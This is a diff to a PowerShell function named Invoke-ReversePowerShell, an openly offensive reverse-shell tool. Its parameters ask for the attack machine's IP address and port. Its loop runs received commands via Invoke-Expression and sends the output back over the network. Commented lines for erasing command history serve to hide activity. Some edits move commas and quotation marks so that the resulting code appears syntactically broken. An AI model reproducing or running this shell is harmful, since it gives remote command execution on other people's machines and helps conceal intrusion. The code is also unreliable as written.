@@ -80,7 +80,7 @@ Function Invoke-ReversePowerShell {
                 Mandatory=$True,
                 Position=0,
                 ValueFromPipeline=$True,
-                ValueFromPipelineByPropertyName = $True,
+                ValueFromPipelineByPropertyName = $True
                 HelpMessage="Enter the IP Address of your attack machine. Example: 10.10.14.21"
             )] # End Parameter
                 [ValidateNotNullorEmpty()]
@@ -89,7 +89,7 @@ Function Invoke-ReversePowerShell {
             [Parameter(
                 Mandatory=$True,
                 Position=1,
-                ValueFromPipeline=$False
+                ValueFromPipeline=$False,
                 HelpMessage="Enter the port number your attack machine is listening on. Example: 1234"
             )] # End Parameter
                 [ValidateNotNullorEmpty()]
@@ -128,54 +128,37 @@ Function Invoke-ReversePowerShell {
                 
                     Clear-Host
 
-                    Write-Information "If you wish to clear your command history when exiting shell uncomment the below lines
+                    Write-Information "If you wish to clear your command history when exiting shell uncomment the below lines"
                     # Clear-History
                     # Clear-Content -Path ((Get-PSReadlineOption).HistorySavePath) -Force
-
                     $Client.Close()
-
                     Exit
-
                 } # End If
-
                 Try
                 {
-
                     # Executes commands
                     $ExecuteCmd = Invoke-Expression -Command $Command -ErrorAction SilentlyContinue | Out-String
-
                     $ExecuteCmdAgain  = $ExecuteCmd + "PS " + (Get-Location).Path + "> "
-
                 } # End Try
                 Catch
                 {
-
                     $Error[0].ToString() + $Error[0].InvocationInfo.PositionMessage
-
                     $ExecuteCmdAgain  =  "ERROR: " + $Error[0].ToString() + "`n`n" + "PS " + (Get-Location).Path + "> "
-
                     Clear-Host
-
                 } # End Catch
-
                 $ReturnBytes = ([Text.Encoding]::ASCII).GetBytes($ExecuteCmdAgain)
-
                 $Stream.Write($ReturnBytes,0,$ReturnBytes.Length)
-
                 $Stream.Flush()
-
             } # End While
-
         } # End Try
         Catch
         {
         
             Write-Host "There was an initial connection error. Retrying in 30 seconds..." -ForegroundColor 'Red'
-
             If($Client.Connected)
             {
             
-                Write-Information "If you wish to clear your command history when exiting shell uncomment the below lines"
+                Write-Information "If you wish to clear your command history when exiting shell uncomment the below lines
                 # Clear-History
                 # Clear-Content -Path ((Get-PSReadlineOption).HistorySavePath) -Force
 
@@ -188,11 +171,7 @@ Function Invoke-ReversePowerShell {
             Write-Information "If you wish to clear your command history when exiting shell uncomment the below lines
             # Clear-History
             # Clear-Content -Path ((Get-PSReadlineOption).HistorySavePath) -Force
-
             Start-Sleep -Seconds 30
-
         } # End Catch
-
     } # End While
-
 } # End Function Invoke-ReversePowerShell
